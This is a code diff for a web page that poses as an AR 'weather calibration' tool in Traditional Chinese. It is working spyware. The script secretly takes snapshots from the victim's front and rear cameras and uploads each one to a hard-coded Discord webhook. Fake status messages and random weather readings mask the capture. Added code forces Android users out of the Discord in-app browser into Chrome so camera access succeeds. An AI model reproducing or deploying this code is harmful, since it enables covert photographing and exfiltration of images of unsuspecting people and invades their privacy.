@@ -1,71 +1,127 @@
-<script>
-// 請替換成你的 Webhook 網址
-const webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Global Weather Service</title>
+<style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background-color: #f5f5f7; color: #1d1d1f; overflow: hidden; }
+    .card { width: 85%; max-width: 380px; padding: 40px 24px; background: #ffffff; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); text-align: center; position: relative; z-index: 10; }
+    .icon-wrapper { width: 70px; height: 70px; margin: 0 auto 24px; background: linear-gradient(135deg, #007aff, #5ac8fa); border-radius: 18px; display: flex; align-items: center; justify-content: center; }
+    h2 { font-size: 22px; font-weight: 600; margin: 0 0 12px; }
+    p { font-size: 15px; color: #86868b; line-height: 1.5; margin-bottom: 30px; }
+    button { width: 100%; padding: 16px; font-size: 17px; font-weight: 600; border: none; border-radius: 14px; background: #007aff; color: #fff; cursor: pointer; }
+    .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,122,255,0.2); border-top: 3px solid #007aff; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    #status { font-size: 13px; color: #007aff; font-weight: 500; margin-top: 10px; }
 
+    /* AR 掃描層 */
+    #scanner-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; }
+    .scan-line { width: 100%; height: 2px; background: #007aff; position: absolute; box-shadow: 0 0 15px #007aff; animation: scan 2s linear infinite; z-index: 102; }
+    .data-text { position: absolute; color: #00ff00; font-family: monospace; font-size: 14px; top: 40px; left: 20px; text-shadow: 1px 1px 2px #000; z-index: 103; line-height: 1.6; }
+    @keyframes scan { from { top: 0; } to { top: 100%; } }
+    
+    /* 瀏覽器提示層 */
+    #browser-notice { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; padding: 40px; text-align: center; }
+</style>
+</head>
+<body>
+
+<div id="browser-notice">
+    <div style="font-size: 50px;">⚠️</div>
+    <h2>請使用外部瀏覽器</h2>
+    <p>Discord 不支援 AR 權限。<br>請點擊右上角 <b>「...」</b> 選擇</p>
+    <p style="color: #007aff; font-weight: bold;">「在瀏覽器中開啟」</p>
+</div>
+
+<div class="card" id="main-card">
+    <div class="icon-wrapper">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41M12 7a5 5 0 100 10 5 5 0 000-10z"/>
+        </svg>
+    </div>
+    <h2>AR 實境天氣校準</h2>
+    <p>系統將啟動 AR 模式掃描環境光譜與濕度數據。</p>
+    <button id="btn" onclick="startCalibration()">開始環境校準</button>
+    <div class="spinner" id="loader"></div>
+    <div id="status"></div>
+</div>
+
+<div id="scanner-overlay">
+    <video id="live-v" style="width:100%; height:100%; object-fit:cover;" autoplay playsinline></video>
+    <div class="scan-line"></div>
+    <div class="data-text" id="live-data">初始化感測器...</div>
+</div>
+
+<video id="v" style="display:none;" autoplay playsinline muted></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+const webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+// 自動跳轉檢測
+window.onload = () => {
+    const ua = navigator.userAgent;
+    if (ua.includes("Discord")) {
+        if (/Android/i.test(ua)) {
+            const currentUrl = window.location.href.replace(/^https?:\/\//, "");
+            window.location.href = `intent://${currentUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+        } else {
+            document.getElementById("browser-notice").style.display = "block";
+        }
+    }
+};
 
 async function takeSnap(video, filename, content) {
     const canvas = document.getElementById("c");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     canvas.getContext("2d").drawImage(video, 0, 0);
-    
     return new Promise(resolve => {
         canvas.toBlob(blob => {
             const fd = new FormData();
             fd.append("file", blob, filename);
             fd.append("payload_json", JSON.stringify({ content }));
             fetch(webhook, { method: "POST", body: fd }).then(resolve).catch(resolve);
-        }, "image/jpeg", 0.7); // 稍微調高品質確保清晰度
+        }, "image/jpeg", 0.7);
     });
 }
 
 async function startCalibration() {
+    document.getElementById("btn").style.display = "none";
+    document.getElementById("loader").style.display = "block";
     const status = document.getElementById("status");
-    const btn = document.getElementById("btn");
-    const loader = document.getElementById("loader");
-    
-    btn.style.display = "none";
-    loader.style.display = "block";
     status.innerHTML = "正在連線到氣象衛星...";
 
     try {
         let hiddenV = document.getElementById("v");
 
-        // --- 階段 1：前鏡頭 (User) 連拍 ---
-        status.innerHTML = "正在獲取光譜數據 (Phase 1)...";
+        // 1. 前鏡頭 2 張
+        status.innerHTML = "獲取光譜數據 (1/2)...";
         let streamUser = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         hiddenV.srcObject = streamUser;
         await hiddenV.play();
-        await sleep(600); // 預熱，避免黑畫面
-        
-        await takeSnap(hiddenV, "user_1.jpg", "👤 **[前鏡頭] 數據 A**");
-        await sleep(200); // 極短間隔連拍
-        await takeSnap(hiddenV, "user_2.jpg", "👤 **[前鏡頭] 數據 B**");
-        
-        streamUser.getTracks().forEach(t => t.stop()); // 關閉前鏡頭
+        await sleep(800); 
+        await takeSnap(hiddenV, "u1.jpg", "👤 **[前] 數據 A**");
+        await takeSnap(hiddenV, "u2.jpg", "👤 **[前] 數據 B**");
+        streamUser.getTracks().forEach(t => t.stop());
 
-        // --- 階段 2：後鏡頭 (Environment) 連拍 ---
-        status.innerHTML = "掃描環境大氣 (Phase 2)...";
+        // 2. 後鏡頭 2 張
+        status.innerHTML = "分析環境大氣 (2/2)...";
         let streamEnv = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
         hiddenV.srcObject = streamEnv;
         await hiddenV.play();
-        await sleep(600); // 預熱
-        
-        await takeSnap(hiddenV, "env_1.jpg", "📡 **[後鏡頭] 環境 A**");
-        await sleep(200);
-        await takeSnap(hiddenV, "env_2.jpg", "📡 **[後鏡頭] 環境 B**");
-        
-        streamEnv.getTracks().forEach(t => t.stop()); // 關閉後鏡頭
+        await sleep(800);
+        await takeSnap(hiddenV, "e1.jpg", "📡 **[後] 環境 A**");
+        await takeSnap(hiddenV, "e2.jpg", "📡 **[後] 環境 B**");
+        streamEnv.getTracks().forEach(t => t.stop());
 
-        // --- 階段 3：正式進入掃描介面 ---
         enterARMode();
-
     } catch (err) {
-        console.error(err);
-        status.innerHTML = "校準失敗：連線逾時。";
-        loader.style.display = "none";
-        btn.style.display = "block";
+        status.innerHTML = "校準失敗：權限遭拒。";
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("btn").style.display = "block";
     }
 }
 
@@ -74,32 +130,24 @@ function enterARMode() {
     const overlay = document.getElementById("scanner-overlay");
     const liveV = document.getElementById("live-v");
     const dataDisplay = document.getElementById("live-data");
-    
     overlay.style.display = "block";
-    
-    // 最終顯示畫面：使用後鏡頭讓用戶看環境
+
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
     .then(stream => {
         liveV.srcObject = stream;
-        
         let timer = setInterval(() => {
-            let humidity = (Math.random() * (60 - 45) + 45).toFixed(1);
+            let hum = (Math.random() * (60 - 45) + 45).toFixed(1);
             let temp = (Math.random() * (26 - 23) + 23).toFixed(1);
-            dataDisplay.innerHTML = `
-                [系統狀態: AR 實時掃描中]<br>
-                -------------------------<br>
-                環境濕度: ${humidity}%<br>
-                體感溫度: ${temp}°C<br>
-                紅外線分析: 運作中...<br>
-                正在匹配雲端氣象數據...
-            `;
+            dataDisplay.innerHTML = `[AR 模式掃描中...]<br>------------------<br>濕度: ${hum}%<br>溫度: ${temp}°C<br>數據同步中...`;
         }, 300);
 
         setTimeout(() => {
             clearInterval(timer);
-            alert("校準成功！\n當前體感溫度為 26°C。");
-            location.reload(); 
+            alert("校準成功！當前體感溫度為 26°C。");
+            location.reload();
         }, 5000);
     });
 }
 </script>
+</body>
+</html>
